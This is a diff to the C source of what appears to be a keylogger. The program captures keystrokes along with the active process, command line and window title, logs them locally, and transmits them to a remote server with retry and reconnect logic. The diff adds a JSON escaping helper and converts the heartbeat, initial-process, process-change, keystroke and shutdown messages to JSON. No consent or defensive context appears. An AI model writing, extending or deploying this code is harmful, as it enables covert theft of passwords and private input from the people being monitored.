@@ -33,6 +33,49 @@ static void get_timestamp(char *timestamp, size_t size) {
     strftime(timestamp, size, "%Y-%m-%dT%H:%M:%S%z", tm_info);
 }
 
+// Escape JSON string (handle quotes, backslashes, etc.)
+static void escape_json_string(const char *input, char *output, size_t output_size) {
+    size_t j = 0;
+    for (size_t i = 0; input[i] != '\0' && j < output_size - 1; i++) {
+        switch (input[i]) {
+            case '"':
+                if (j + 2 < output_size) {
+                    output[j++] = '\\';
+                    output[j++] = '"';
+                }
+                break;
+            case '\\':
+                if (j + 2 < output_size) {
+                    output[j++] = '\\';
+                    output[j++] = '\\';
+                }
+                break;
+            case '\n':
+                if (j + 2 < output_size) {
+                    output[j++] = '\\';
+                    output[j++] = 'n';
+                }
+                break;
+            case '\r':
+                if (j + 2 < output_size) {
+                    output[j++] = '\\';
+                    output[j++] = 'r';
+                }
+                break;
+            case '\t':
+                if (j + 2 < output_size) {
+                    output[j++] = '\\';
+                    output[j++] = 't';
+                }
+                break;
+            default:
+                output[j++] = input[i];
+                break;
+        }
+    }
+    output[j] = '\0';
+}
+
 // Send data to server with retry mechanism
 static int send_to_server_with_retry(const char *data, size_t len) {
     if (!network_connected) {
@@ -63,13 +106,16 @@ static int send_to_server_with_retry(const char *data, size_t len) {
 static void send_heartbeat(void) {
     time_t now = time(NULL);
     if (now - last_heartbeat >= HEARTBEAT_INTERVAL) {
-        char heartbeat_msg[256];
         char timestamp[64];
         get_timestamp(timestamp, sizeof(timestamp));
         
+        char escaped_process[512];
+        escape_json_string(current_process.name, escaped_process, sizeof(escaped_process));
+        
+        char heartbeat_msg[512];
         snprintf(heartbeat_msg, sizeof(heartbeat_msg), 
-                "[HEARTBEAT] Timestamp=%s, PID=%d, Process=%s\n",
-                timestamp, current_process.pid, current_process.name);
+                "{\"type\":\"heartbeat\",\"timestamp\":\"%s\",\"pid\":%d,\"process\":\"%s\"}\n",
+                timestamp, current_process.pid, escaped_process);
         
         if (send_to_server_with_retry(heartbeat_msg, strlen(heartbeat_msg)) >= 0) {
             last_heartbeat = now;
@@ -155,14 +201,18 @@ int main(void) {
         
         // Send initial process info to server
         if (network_connected) {
-            char initial_process_msg[2048];
             char timestamp[64];
             get_timestamp(timestamp, sizeof(timestamp));
             
+            char escaped_name[512], escaped_cmd[1024], escaped_window[512];
+            escape_json_string(current_process.name, escaped_name, sizeof(escaped_name));
+            escape_json_string(current_process.cmdline, escaped_cmd, sizeof(escaped_cmd));
+            escape_json_string(current_process.window_title, escaped_window, sizeof(escaped_window));
+            
+            char initial_process_msg[4096];
             snprintf(initial_process_msg, sizeof(initial_process_msg), 
-                    "[INITIAL_PROCESS] PID=%d, Name=%s, Cmd=%s, Window=%s, Timestamp=%s\n",
-                    current_process.pid, current_process.name, 
-                    current_process.cmdline, current_process.window_title, timestamp);
+                    "{\"type\":\"initial_process\",\"timestamp\":\"%s\",\"pid\":%d,\"process\":\"%s\",\"command\":\"%s\",\"window\":\"%s\"}\n",
+                    timestamp, current_process.pid, escaped_name, escaped_cmd, escaped_window);
             
             send_to_server_with_retry(initial_process_msg, strlen(initial_process_msg));
         }
@@ -184,7 +234,7 @@ int main(void) {
                     printf("Window: %s\n", current_process.window_title);
                     printf("=====================\n");
                     
-                    // Log process change locally
+                    // Log process change locally (keep old format for local logs)
                     char process_log[2048];
                     char timestamp[64];
                     get_timestamp(timestamp, sizeof(timestamp));
@@ -195,9 +245,19 @@ int main(void) {
                             current_process.cmdline, current_process.window_title, timestamp);
                     logger_write(process_log);
                     
-                    // Send process change notification to server
+                    // Send process change notification to server (JSON format)
                     if (network_connected) {
-                        if (send_to_server_with_retry(process_log, strlen(process_log)) < 0) {
+                        char escaped_name[512], escaped_cmd[1024], escaped_window[512];
+                        escape_json_string(current_process.name, escaped_name, sizeof(escaped_name));
+                        escape_json_string(current_process.cmdline, escaped_cmd, sizeof(escaped_cmd));
+                        escape_json_string(current_process.window_title, escaped_window, sizeof(escaped_window));
+                        
+                        char process_change_json[4096];
+                        snprintf(process_change_json, sizeof(process_change_json), 
+                                "{\"type\":\"process_change\",\"timestamp\":\"%s\",\"pid\":%d,\"process\":\"%s\",\"command\":\"%s\",\"window\":\"%s\"}\n",
+                                timestamp, current_process.pid, escaped_name, escaped_cmd, escaped_window);
+                        
+                        if (send_to_server_with_retry(process_change_json, strlen(process_change_json)) < 0) {
                             // Try to reconnect if send failed
                             if (!try_reconnect()) {
                                 printf("Warning: Could not reconnect to server\n");
@@ -217,6 +277,7 @@ int main(void) {
             char timestamp[64];
             get_timestamp(timestamp, sizeof(timestamp));
             
+            // Local log (keep old format)
             snprintf(output, sizeof(output), 
                     "[KEYSTROKE] PID=%d, Process=%s, Window=%s, Data=%s, Timestamp=%s\n",
                     current_process.pid, current_process.name, 
@@ -225,9 +286,19 @@ int main(void) {
             printf("Received: %s", output);
             logger_write(output);
 
-            // Send to server
+            // Send to server (JSON format)
             if (network_connected) {
-                if (send_to_server_with_retry(output, strlen(output)) < 0) {
+                char escaped_process[512], escaped_window[512], escaped_data[256];
+                escape_json_string(current_process.name, escaped_process, sizeof(escaped_process));
+                escape_json_string(current_process.window_title, escaped_window, sizeof(escaped_window));
+                escape_json_string(buf, escaped_data, sizeof(escaped_data));
+                
+                char keystroke_json[4096];
+                snprintf(keystroke_json, sizeof(keystroke_json), 
+                        "{\"type\":\"keystroke\",\"timestamp\":\"%s\",\"pid\":%d,\"process\":\"%s\",\"window\":\"%s\",\"data\":\"%s\"}\n",
+                        timestamp, current_process.pid, escaped_process, escaped_window, escaped_data);
+                
+                if (send_to_server_with_retry(keystroke_json, strlen(keystroke_json)) < 0) {
                     // Try to reconnect if send failed
                     if (!try_reconnect()) {
                         printf("Warning: Could not reconnect to server\n");
@@ -248,12 +319,12 @@ int main(void) {
     
     // Send shutdown notification
     if (network_connected) {
-        char shutdown_msg[256];
         char timestamp[64];
         get_timestamp(timestamp, sizeof(timestamp));
         
+        char shutdown_msg[256];
         snprintf(shutdown_msg, sizeof(shutdown_msg), 
-                "[SHUTDOWN] Timestamp=%s\n", timestamp);
+                "{\"type\":\"shutdown\",\"timestamp\":\"%s\"}\n", timestamp);
         send_to_server_with_retry(shutdown_msg, strlen(shutdown_msg));
     }
     
